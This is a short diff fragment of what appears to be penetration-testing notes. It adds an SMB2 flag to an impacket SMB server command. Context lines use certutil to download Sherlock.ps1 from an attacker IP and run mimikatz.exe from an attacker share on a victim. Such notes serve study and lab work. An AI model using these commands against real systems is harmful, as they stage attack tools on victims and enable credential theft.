@@ -74,7 +74,7 @@ certutil.exe -urlcache -f http://<IP>/Sherlock.ps1 Sherlock,ps1
 
 ```bash
 # In directory with file
-impacket-smbserver share .
+impacket-smbserver share . -smb2support
 
 # From victim
 \\10.10.10.10\share\mimikatz.exe 
